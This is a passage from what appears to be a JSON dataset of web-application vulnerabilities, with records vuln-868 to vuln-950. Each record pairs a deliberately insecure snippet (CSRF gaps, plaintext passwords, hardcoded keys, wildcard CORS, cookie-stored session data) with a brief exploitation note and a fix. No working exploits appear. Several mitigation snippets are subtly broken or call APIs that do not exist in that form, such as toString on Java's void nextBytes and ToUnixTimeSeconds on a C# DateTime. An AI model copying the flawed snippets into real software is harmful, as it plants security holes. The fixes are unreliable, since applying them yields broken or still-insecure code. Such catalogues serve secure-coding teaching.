  "exploitation_techniques": "Enable clickjacking.",
  "mitigation": "Add: Response.Headers.Add(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-869",
  "language": "Kotlin",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "get(\"/\") { call.respondText(\"Home\") }",
  "exploitation_techniques": "Facilitate clickjacking attacks.",
  "mitigation": "Add: call.response.header(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-870",
  "language": "Scala",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing security headers.",
  "code_snippet": "get(\"/\") { Ok(\"Home\") }",
  "exploitation_techniques": "Enable clickjacking.",
  "mitigation": "Add: Ok(\"Home\").withHeaders(\"X-Frame-Options\" -> \"DENY\")"
}
{
  "id": "vuln-871",
  "language": "Rust",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "router.get(\"/\", |_, res| res.render_text(\"Home\"))",
  "exploitation_techniques": "Facilitate clickjacking attacks.",
  "mitigation": "Add: res.header(\"X-Frame-Options\", \"DENY\")"
}
{
  "id": "vuln-872",
  "language": "Elixir",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing security headers.",
  "code_snippet": "get \"/\", do: send_resp(conn, 200, \"Home\")",
  "exploitation_techniques": "Enable clickjacking.",
  "mitigation": "Add: put_resp_header(conn, \"x-frame-options\", \"DENY\")"
}
{
  "id": "vuln-873",
  "language": "Perl",
  "vulnerability_type": "Insecure HTTP Headers",
  "description": "Missing X-Frame-Options header.",
  "code_snippet": "$r->print('Home');",
  "exploitation_techniques": "Facilitate clickjacking attacks.",
  "mitigation": "Add: $r->headers_out->set('X-Frame-Options' => 'DENY');"
}
{
  "id": "vuln-874",
  "language": "Node.js",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "No CSRF token validation.",
  "code_snippet": "app.post('/update', (req, res) => updateUser(req.body));",
  "exploitation_techniques": "Forge requests to perform unauthorized actions.",
  "mitigation": "Use CSRF: app.use(csrf()); app.post('/update', csrfMiddleware, updateUser)"
}
{
  "id": "vuln-875",
  "language": "Python",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "Missing CSRF token validation.",
  "code_snippet": "@app.route('/update', methods=['POST']) def update(): update_user(request.form)",
  "exploitation_techniques": "Execute unauthorized actions via forged requests.",
  "mitigation": "Use CSRF: from flask_wtf.csrf import CSRFProtect; csrf = CSRFProtect(app)"
}
{
  "id": "vuln-876",
  "language": "Java",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "No CSRF protection on state-changing requests.",
  "code_snippet": "@PostMapping(\"/update\") public void update(@RequestBody User user) { userRepo.save(user); }",
  "exploitation_techniques": "Forge requests to modify data.",
  "mitigation": "Add CSRF: @CsrfTokenRequired"
}
{
  "id": "vuln-877",
  "language": "PHP",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "Missing CSRF token validation.",
  "code_snippet": "$user = $_POST; update_user($user);",
  "exploitation_techniques": "Perform unauthorized actions via forged requests.",
  "mitigation": "Validate CSRF: if (validate_csrf_token($_POST['csrf_token'])) update_user($user);"
}
{
  "id": "vuln-878",
  "language": "Ruby",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "No CSRF protection.",
  "code_snippet": "post '/update' do update_user(params) end",
  "exploitation_techniques": "Forge requests to change data.",
  "mitigation": "Enable CSRF: protect_from_forgery with: :exception"
}
{
  "id": "vuln-879",
  "language": "Go",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "Missing CSRF token validation.",
  "code_snippet": "http.HandleFunc(\"/update\", func(w http.ResponseWriter, r *http.Request) { updateUser(r.Form) })",
  "exploitation_techniques": "Execute unauthorized actions.",
  "mitigation": "Validate CSRF: if validateCsrfToken(r.FormValue(\"csrf_token\")) { updateUser(...) }"
}
{
  "id": "vuln-880",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "No CSRF protection on POST requests.",
  "code_snippet": "[HttpPost(\"/update\")] public IActionResult Update(User user) { db.Save(user); }",
  "exploitation_techniques": "Forge requests to modify data.",
  "mitigation": "Add CSRF: [ValidateAntiForgeryToken]"
}
{
  "id": "vuln-881",
  "language": "Kotlin",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "Missing CSRF token validation.",
  "code_snippet": "post(\"/update\") { call.receive<User>().let { updateUser(it) } }",
  "exploitation_techniques": "Perform unauthorized actions.",
  "mitigation": "Validate CSRF: if (validateCsrfToken(call.parameters[\"csrf_token\"])) updateUser(...)"
}
{
  "id": "vuln-882",
  "language": "Scala",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "No CSRF protection.",
  "code_snippet": "post(\"/update\") { updateUser(request.body.asJson) }",
  "exploitation_techniques": "Forge requests to change data.",
  "mitigation": "Add CSRF: CSRFAction { updateUser(...) } if validCsrfToken"
}
{
  "id": "vuln-883",
  "language": "Rust",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "Missing CSRF token validation.",
  "code_snippet": "router.post(\"/update\", |req, res| update_user(req.form::<User>()?.await))",
  "exploitation_techniques": "Execute unauthorized actions.",
  "mitigation": "Validate CSRF: if validate_csrf_token(req.form::<Token>()?.await) { update_user(...) }"
}
{
  "id": "vuln-884",
  "language": "Elixir",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "No CSRF protection on state-changing requests.",
  "code_snippet": "post \"/update\", do: update_user(conn, params)",
  "exploitation_techniques": "Forge requests to modify data.",
  "mitigation": "Add CSRF: plug :protect_from_forgery"
}
{
  "id": "vuln-885",
  "language": "Perl",
  "vulnerability_type": "Insecure CSRF Token Handling",
  "description": "Missing CSRF token validation.",
  "code_snippet": "my $user = $r->param('user'); update_user($user);",
  "exploitation_techniques": "Perform unauthorized actions.",
  "mitigation": "Validate CSRF: if (validate_csrf_token($r->param('csrf_token'))) { update_user(...) }"
}
{
  "id": "vuln-886",
  "language": "Node.js",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in client-side cookies.",
  "code_snippet": "res.cookie('user_data', JSON.stringify({ id: user.id, role: user.role }));",
  "exploitation_techniques": "Steal sensitive data from cookies.",
  "mitigation": "Store in server-side session: req.session.user = { id: user.id, role: user.role }"
}
{
  "id": "vuln-887",
  "language": "Python",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in client-side cookies.",
  "code_snippet": "response.set_cookie('user_data', json.dumps({'id': user.id, 'role': user.role}))",
  "exploitation_techniques": "Access sensitive data via cookies.",
  "mitigation": "Use server-side session: session['user'] = {'id': user.id, 'role': user.role}"
}
{
  "id": "vuln-888",
  "language": "Java",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in cookies.",
  "code_snippet": "Cookie cookie = new Cookie(\"user_data\", user.getId() + \":\" + user.getRole()); response.addCookie(cookie);",
  "exploitation_techniques": "Steal sensitive data from cookies.",
  "mitigation": "Use HttpSession: session.setAttribute(\"user\", user)"
}
{
  "id": "vuln-889",
  "language": "PHP",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in client-side cookies.",
  "code_snippet": "setcookie('user_data', json_encode(['id' => $user['id'], 'role' => $user['role']]));",
  "exploitation_techniques": "Access sensitive data via cookies.",
  "mitigation": "Use session: $_SESSION['user'] = ['id' => $user['id'], 'role' => $user['role']]"
}
{
  "id": "vuln-890",
  "language": "Ruby",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in cookies.",
  "code_snippet": "cookies[:user_data] = { id: user.id, role: user.role }.to_json",
  "exploitation_techniques": "Steal sensitive data from cookies.",
  "mitigation": "Use session: session[:user] = { id: user.id, role: user.role }"
}
{
  "id": "vuln-891",
  "language": "Go",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in cookies.",
  "code_snippet": "http.SetCookie(w, &http.Cookie{Name: \"user_data\", Value: fmt.Sprintf(\"%d:%s\", user.ID, user.Role)})",
  "exploitation_techniques": "Access sensitive data via cookies.",
  "mitigation": "Use session: session.Values[\"user\"] = user"
}
{
  "id": "vuln-892",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in cookies.",
  "code_snippet": "Response.Cookies.Append(\"user_data\", JsonSerializer.Serialize(new { user.Id, user.Role }));",
  "exploitation_techniques": "Steal sensitive data from cookies.",
  "mitigation": "Use session: HttpContext.Session.SetString(\"user\", JsonSerializer.Serialize(user))"
}
{
  "id": "vuln-893",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in client-side cookies.",
  "code_snippet": "call.response.cookies.append(\"user_data\", Json.encodeToString(User(id, role)))",
  "exploitation_techniques": "Access sensitive data via cookies.",
  "mitigation": "Use session: call.sessions.set(UserSession(id, role))"
}
{
  "id": "vuln-894",
  "language": "Scala",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in cookies.",
  "code_snippet": "Ok.withCookies(Cookie(\"user_data\", s\"${user.id}:${user.role}\"))",
  "exploitation_techniques": "Steal sensitive data from cookies.",
  "mitigation": "Use session: Ok.withSession(\"user\" -> Json.toJson(user).toString)"
}
{
  "id": "vuln-895",
  "language": "Rust",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in cookies.",
  "code_snippet": "res.cookie(Cookie::new(\"user_data\", format!(\"{}:{}\", user.id, user.role)))",
  "exploitation_techniques": "Access sensitive data via cookies.",
  "mitigation": "Use session: req.session()?.set(\"user\", user)?"
}
{
  "id": "vuln-896",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in client-side cookies.",
  "code_snippet": "put_resp_cookie(conn, \"user_data\", %{id: user.id, role: user.role})",
  "exploitation_techniques": "Steal sensitive data from cookies.",
  "mitigation": "Use session: put_session(conn, :user, %{id: user.id, role: user.role})"
}
{
  "id": "vuln-897",
  "language": "Perl",
  "vulnerability_type": "Insecure Session Storage",
  "description": "Storing sensitive data in cookies.",
  "code_snippet": "$r->headers_out->set('Set-Cookie' => \"user_data=$user->{id}:$user->{role}\");",
  "exploitation_techniques": "Access sensitive data via cookies.",
  "mitigation": "Use session: $r->session->{user} = { id => $user->{id}, role => $user->{role} };"
}
{
  "id": "vuln-898",
  "language": "Node.js",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens with no or long expiration.",
  "code_snippet": "const token = crypto.randomBytes(32).toString('hex');",
  "exploitation_techniques": "Reuse tokens indefinitely.",
  "mitigation": "Set expiry: jwt.sign({ exp: Math.floor(Date.now() / 1000) + 3600 }, secret)"
}
{
  "id": "vuln-899",
  "language": "Python",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens without expiration.",
  "code_snippet": "token = secrets.token_hex(32)",
  "exploitation_techniques": "Use stolen tokens without time limit.",
  "mitigation": "Set expiry: jwt.encode({'exp': time.time() + 3600}, secret)"
}
{
  "id": "vuln-900",
  "language": "Java",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens with no expiration.",
  "code_snippet": "String token = new SecureRandom().nextBytes(new byte[32]).toString();",
  "exploitation_techniques": "Reuse tokens indefinitely.",
  "mitigation": "Set expiry: JWT.create().withExpiresAt(new Date(System.currentTimeMillis() + 3600000)).sign(Algorithm.HMAC256(secret))"
}
{
  "id": "vuln-901",
  "language": "PHP",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens without expiration.",
  "code_snippet": "$token = bin2hex(random_bytes(32));",
  "exploitation_techniques": "Reuse stolen tokens indefinitely.",
  "mitigation": "Set expiry: JWT::encode(['exp' => time() + 3600], $secret, 'HS256')"
}
{
  "id": "vuln-902",
  "language": "Ruby",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens with no expiration.",
  "code_snippet": "token = SecureRandom.hex(32)",
  "exploitation_techniques": "Use stolen tokens without time limit.",
  "mitigation": "Set expiry: JWT.encode({ exp: Time.now.to_i + 3600 }, secret, 'HS256')"
}
{
  "id": "vuln-903",
  "language": "Go",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens without expiration.",
  "code_snippet": "token := hex.EncodeToString(cryptoRand(32))",
  "exploitation_techniques": "Reuse tokens indefinitely.",
  "mitigation": "Set expiry: jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{\"exp\": time.Now().Add(time.Hour).Unix()}).SignedString(secret)"
}
{
  "id": "vuln-904",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens with no expiration.",
  "code_snippet": "var token = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));",
  "exploitation_techniques": "Use stolen tokens without time limit.",
  "mitigation": "Set expiry: new JwtSecurityToken(claims: new[] { new Claim(\"exp\", DateTime.UtcNow.AddHours(1).ToUnixTimeSeconds().ToString()) })"
}
{
  "id": "vuln-905",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens without expiration.",
  "code_snippet": "val token = SecureRandom().nextBytes(32).toHex()",
  "exploitation_techniques": "Reuse stolen tokens indefinitely.",
  "mitigation": "Set expiry: JWT.create().withExpiresAt(Date(System.currentTimeMillis() + 3600000)).sign(Algorithm.HMAC256(secret))"
}
{
  "id": "vuln-906",
  "language": "Scala",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens with no expiration.",
  "code_snippet": "val token = SecureRandom.getInstance(\"SHA1PRNG\").nextBytes(32).toHex",
  "exploitation_techniques": "Use stolen tokens without time limit.",
  "mitigation": "Set expiry: JWT.create().withExpiresAt(new Date(System.currentTimeMillis() + 3600000)).sign(Algorithm.HMAC256(secret))"
}
{
  "id": "vuln-907",
  "language": "Rust",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens without expiration.",
  "code_snippet": "let token = hex::encode(rand::random::<[u8; 32]>());",
  "exploitation_techniques": "Reuse stolen tokens indefinitely.",
  "mitigation": "Set expiry: jsonwebtoken::encode(&Header::default(), &Claims { exp: chrono::Utc::now().timestamp() + 3600 }, &secret)"
}
{
  "id": "vuln-908",
  "language": "Elixir",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens with no expiration.",
  "code_snippet": "token = :crypto.strong_rand_bytes(32) |> Base.encode16()",
  "exploitation_techniques": "Use stolen tokens without time limit.",
  "mitigation": "Set expiry: Joken.generate_and_sign(%{exp: :os.system_time(:second) + 3600}, signer)"
}
{
  "id": "vuln-909",
  "language": "Perl",
  "vulnerability_type": "Insecure Random Token Lifetime",
  "description": "Tokens without expiration.",
  "code_snippet": "my $token = unpack('H*', Crypt::Random::Source::random_bytes(32));",
  "exploitation_techniques": "Reuse stolen tokens indefinitely.",
  "mitigation": "Set expiry: JWT::encode({ exp => time() + 3600 }, $secret, 'HS256')"
}
{
  "id": "vuln-910",
  "language": "Node.js",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in source code.",
  "code_snippet": "const apiKey = 'sk_1234567890'; axios.get('https://api.example.com', { headers: { Authorization: apiKey } });",
  "exploitation_techniques": "Extract API keys from source code or logs.",
  "mitigation": "Use env: const apiKey = process.env.API_KEY;"
}
{
  "id": "vuln-911",
  "language": "Python",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in code.",
  "code_snippet": "api_key = 'sk_1234567890'; requests.get('https://api.example.com', headers={'Authorization': api_key})",
  "exploitation_techniques": "Steal API keys from code or logs.",
  "mitigation": "Use env: api_key = os.getenv('API_KEY')"
}
{
  "id": "vuln-912",
  "language": "Java",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in source code.",
  "code_snippet": "String apiKey = \"sk_1234567890\"; HttpClient.newHttpClient().send(HttpRequest.newBuilder().uri(URI.create(\"https://api.example.com\")).header(\"Authorization\", apiKey).build(), ...);",
  "exploitation_techniques": "Extract API keys from source.",
  "mitigation": "Use env: String apiKey = System.getenv(\"API_KEY\")"
}
{
  "id": "vuln-913",
  "language": "PHP",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in code.",
  "code_snippet": "$api_key = 'sk_1234567890'; curl_setopt($ch, CURLOPT_HTTPHEADER, ['Authorization: ' . $api_key]);",
  "exploitation_techniques": "Steal API keys from source code.",
  "mitigation": "Use env: $api_key = getenv('API_KEY')"
}
{
  "id": "vuln-914",
  "language": "Ruby",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in code.",
  "code_snippet": "api_key = 'sk_1234567890'; HTTParty.get('https://api.example.com', headers: { 'Authorization' => api_key })",
  "exploitation_techniques": "Extract API keys from code.",
  "mitigation": "Use env: api_key = ENV['API_KEY']"
}
{
  "id": "vuln-915",
  "language": "Go",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in source code.",
  "code_snippet": "apiKey := \"sk_1234567890\"; req, _ := http.NewRequest(\"GET\", \"https://api.example.com\", nil); req.Header.Set(\"Authorization\", apiKey)",
  "exploitation_techniques": "Steal API keys from source.",
  "mitigation": "Use env: apiKey := os.Getenv(\"API_KEY\")"
}
{
  "id": "vuln-916",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in code.",
  "code_snippet": "string apiKey = \"sk_1234567890\"; httpClient.DefaultRequestHeaders.Add(\"Authorization\", apiKey);",
  "exploitation_techniques": "Extract API keys from source code.",
  "mitigation": "Use env: string apiKey = Environment.GetEnvironmentVariable(\"API_KEY\")"
}
{
  "id": "vuln-917",
  "language": "Kotlin",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in source code.",
  "code_snippet": "val apiKey = \"sk_1234567890\"; http.get(\"https://api.example.com\") { header(\"Authorization\", apiKey) }",
  "exploitation_techniques": "Steal API keys from code.",
  "mitigation": "Use env: val apiKey = System.getenv(\"API_KEY\")"
}
{
  "id": "vuln-918",
  "language": "Scala",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in code.",
  "code_snippet": "val apiKey = \"sk_1234567890\"; WS.url(\"https://api.example.com\").withHeaders(\"Authorization\" -> apiKey).get()",
  "exploitation_techniques": "Extract API keys from source.",
  "mitigation": "Use env: val apiKey = sys.env(\"API_KEY\")"
}
{
  "id": "vuln-919",
  "language": "Rust",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in source code.",
  "code_snippet": "let api_key = \"sk_1234567890\"; reqwest::Client::new().get(\"https://api.example.com\").header(\"Authorization\", api_key).send()?",
  "exploitation_techniques": "Steal API keys from code.",
  "mitigation": "Use env: let api_key = env::var(\"API_KEY\")?"
}
{
  "id": "vuln-920",
  "language": "Elixir",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in code.",
  "code_snippet": "api_key = \"sk_1234567890\"; HTTPoison.get(\"https://api.example.com\", [{\"Authorization\", api_key}])",
  "exploitation_techniques": "Extract API keys from source.",
  "mitigation": "Use env: api_key = System.get_env(\"API_KEY\")"
}
{
  "id": "vuln-921",
  "language": "Perl",
  "vulnerability_type": "Insecure API Key Exposure",
  "description": "Hardcoded API keys in code.",
  "code_snippet": "my $api_key = 'sk_1234567890'; $ua->get('https://api.example.com', Authorization => $api_key);",
  "exploitation_techniques": "Steal API keys from source code.",
  "mitigation": "Use env: my $api_key = $ENV{'API_KEY'}"
}
{
  "id": "vuln-922",
  "language": "Node.js",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.password = req.body.password; db.save(user);",
  "exploitation_techniques": "Steal passwords from database breaches.",
  "mitigation": "Hash passwords: user.password = bcrypt.hashSync(req.body.password, 10)"
}
{
  "id": "vuln-923",
  "language": "Python",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user['password'] = request.form['password']; db.save(user)",
  "exploitation_techniques": "Extract passwords from database.",
  "mitigation": "Hash: user['password'] = bcrypt.hashpw(request.form['password'].encode(), bcrypt.gensalt())"
}
{
  "id": "vuln-924",
  "language": "Java",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.setPassword(request.getParameter(\"password\")); userRepo.save(user);",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Hash: user.setPassword(BCrypt.hashpw(request.getParameter(\"password\"), BCrypt.gensalt()))"
}
{
  "id": "vuln-925",
  "language": "PHP",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "$user['password'] = $_POST['password']; save_user($user);",
  "exploitation_techniques": "Extract passwords from database breaches.",
  "mitigation": "Hash: $user['password'] = password_hash($_POST['password'], PASSWORD_BCRYPT)"
}
{
  "id": "vuln-926",
  "language": "Ruby",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.password = params[:password]; user.save",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Hash: user.password = BCrypt::Password.create(params[:password])"
}
{
  "id": "vuln-927",
  "language": "Go",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user.Password = r.FormValue(\"password\"); db.Save(user)",
  "exploitation_techniques": "Extract passwords from database.",
  "mitigation": "Hash: user.Password = bcrypt.GenerateFromPassword([]byte(r.FormValue(\"password\")), bcrypt.DefaultCost)"
}
{
  "id": "vuln-928",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.Password = model.Password; db.Save(user);",
  "exploitation_techniques": "Steal passwords from database breaches.",
  "mitigation": "Hash: user.Password = BCrypt.Net.BCrypt.HashPassword(model.Password)"
}
{
  "id": "vuln-929",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user.password = call.parameters[\"password\"]!!; userRepo.save(user)",
  "exploitation_techniques": "Extract passwords from database.",
  "mitigation": "Hash: user.password = BCrypt.hashpw(call.parameters[\"password\"]!!, BCrypt.gensalt())"
}
{
  "id": "vuln-930",
  "language": "Scala",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "user.password = params(\"password\"); userRepo.save(user)",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Hash: user.password = BCrypt.hashpw(params(\"password\"), BCrypt.gensalt())"
}
{
  "id": "vuln-931",
  "language": "Rust",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user.password = req.form::<User>().await?.password; db.save(user)?;",
  "exploitation_techniques": "Extract passwords from database breaches.",
  "mitigation": "Hash: user.password = bcrypt::hash(req.form::<User>().await?.password, DEFAULT_COST)?"
}
{
  "id": "vuln-932",
  "language": "Elixir",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing plain text passwords.",
  "code_snippet": "user = %{password: params[\"password\"]}; Repo.insert(user)",
  "exploitation_techniques": "Steal passwords from database.",
  "mitigation": "Hash: user = %{password: Bcrypt.hash_pwd_salt(params[\"password\"])}; Repo.insert(user)"
}
{
  "id": "vuln-933",
  "language": "Perl",
  "vulnerability_type": "Insecure Password Storage",
  "description": "Storing passwords in plain text.",
  "code_snippet": "my $user = { password => $r->param('password') }; save_user($user);",
  "exploitation_techniques": "Extract passwords from database.",
  "mitigation": "Hash: my $user = { password => Crypt::BCrypt::bcrypt($r->param('password'), '2a', 12) };"
}
{
  "id": "vuln-934",
  "language": "Node.js",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Overly permissive CORS policy.",
  "code_snippet": "app.use(cors({ origin: '*' }));",
  "exploitation_techniques": "Unauthorized cross-origin requests.",
  "mitigation": "Restrict: cors({ origin: 'https://trusted.com' })"
}
{
  "id": "vuln-935",
  "language": "Python",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "app = Flask(__name__); CORS(app, resources={r\"/*\": {\"origins\": \"*\"}})",
  "exploitation_techniques": "Perform unauthorized cross-origin requests.",
  "mitigation": "Restrict: CORS(app, resources={r\"/*\": {\"origins\": \"https://trusted.com\"}})"
}
{
  "id": "vuln-936",
  "language": "Java",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Overly permissive CORS settings.",
  "code_snippet": "@CrossOrigin(origins = \"*\") @GetMapping(\"/data\") public Data getData() { ... }",
  "exploitation_techniques": "Unauthorized cross-origin access.",
  "mitigation": "Restrict: @CrossOrigin(origins = \"https://trusted.com\")"
}
{
  "id": "vuln-937",
  "language": "PHP",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "header('Access-Control-Allow-Origin: *');",
  "exploitation_techniques": "Perform unauthorized cross-origin requests.",
  "mitigation": "Restrict: header('Access-Control-Allow-Origin: https://trusted.com');"
}
{
  "id": "vuln-938",
  "language": "Ruby",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Overly permissive CORS policy.",
  "code_snippet": "headers['Access-Control-Allow-Origin'] = '*'",
  "exploitation_techniques": "Unauthorized cross-origin requests.",
  "mitigation": "Restrict: headers['Access-Control-Allow-Origin'] = 'https://trusted.com'"
}
{
  "id": "vuln-939",
  "language": "Go",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")",
  "exploitation_techniques": "Perform unauthorized cross-origin requests.",
  "mitigation": "Restrict: w.Header().Set(\"Access-Control-Allow-Origin\", \"https://trusted.com\")"
}
{
  "id": "vuln-940",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Overly permissive CORS settings.",
  "code_snippet": "services.AddCors(options => options.AddPolicy(\"AllowAll\", builder => builder.AllowAnyOrigin()));",
  "exploitation_techniques": "Unauthorized cross-origin access.",
  "mitigation": "Restrict: builder.WithOrigins(\"https://trusted.com\")"
}
{
  "id": "vuln-941",
  "language": "Kotlin",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "install(CORS) { anyHost() }",
  "exploitation_techniques": "Perform unauthorized cross-origin requests.",
  "mitigation": "Restrict: install(CORS) { host(\"trusted.com\", schemes = listOf(\"https\")) }"
}
{
  "id": "vuln-942",
  "language": "Scala",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Overly permissive CORS policy.",
  "code_snippet": "Ok().withHeaders(\"Access-Control-Allow-Origin\" -> \"*\")",
  "exploitation_techniques": "Unauthorized cross-origin requests.",
  "mitigation": "Restrict: Ok().withHeaders(\"Access-Control-Allow-Origin\" -> \"https://trusted.com\")"
}
{
  "id": "vuln-943",
  "language": "Rust",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "res.header(\"Access-Control-Allow-Origin\", \"*\")",
  "exploitation_techniques": "Perform unauthorized cross-origin requests.",
  "mitigation": "Restrict: res.header(\"Access-Control-Allow-Origin\", \"https://trusted.com\")"
}
{
  "id": "vuln-944",
  "language": "Elixir",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Overly permissive CORS settings.",
  "code_snippet": "plug CORSPlug, origin: \"*\"",
  "exploitation_techniques": "Unauthorized cross-origin access.",
  "mitigation": "Restrict: plug CORSPlug, origin: \"https://trusted.com\""
}
{
  "id": "vuln-945",
  "language": "Perl",
  "vulnerability_type": "Insecure CORS Configuration",
  "description": "Allowing all origins in CORS.",
  "code_snippet": "$r->headers_out->set('Access-Control-Allow-Origin' => '*');",
  "exploitation_techniques": "Perform unauthorized cross-origin requests.",
  "mitigation": "Restrict: $r->headers_out->set('Access-Control-Allow-Origin' => 'https://trusted.com');"
}
{
  "id": "vuln-946",
  "language": "Node.js",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated or vulnerable dependencies.",
  "code_snippet": "\"dependencies\": { \"lodash\": \"^4.17.15\" }",
  "exploitation_techniques": "Exploit known vulnerabilities in old packages.",
  "mitigation": "Update: \"lodash\": \"^4.17.21\" and use npm audit"
}
{
  "id": "vuln-947",
  "language": "Python",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated dependencies with known vulnerabilities.",
  "code_snippet": "requirements.txt: requests==2.22.0",
  "exploitation_techniques": "Exploit known package vulnerabilities.",
  "mitigation": "Update: requests>=2.31.0 and use pip-audit"
}
{
  "id": "vuln-948",
  "language": "Java",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using vulnerable library versions.",
  "code_snippet": "<dependency><groupId>com.fasterxml.jackson.core</groupId><artifactId>jackson-databind</artifactId><version>2.9.8</version></dependency>",
  "exploitation_techniques": "Exploit known vulnerabilities in old libraries.",
  "mitigation": "Update: <version>2.15.2</version> and use dependency-check"
}
{
  "id": "vuln-949",
  "language": "PHP",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated composer packages.",
  "code_snippet": "\"require\": { \"monolog/monolog\": \"1.25.0\" }",
  "exploitation_techniques": "Exploit known package vulnerabilities.",
  "mitigation": "Update: \"monolog/monolog\": \"^2.9.1\" and use composer audit"
}
{
  "id": "vuln-950",
  "language": "Ruby",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using vulnerable gem versions.",
  "code_snippet": "gem 'rails', '5.2.3'",
  "exploitation_techniques": "Exploit known vulnerabilities in gems.",
  "mitigation": "Update: gem 'rails', '~> 7.0.8' and use bundle-audit"
}
{
  "id": "vuln-951",
  "language": "Go",
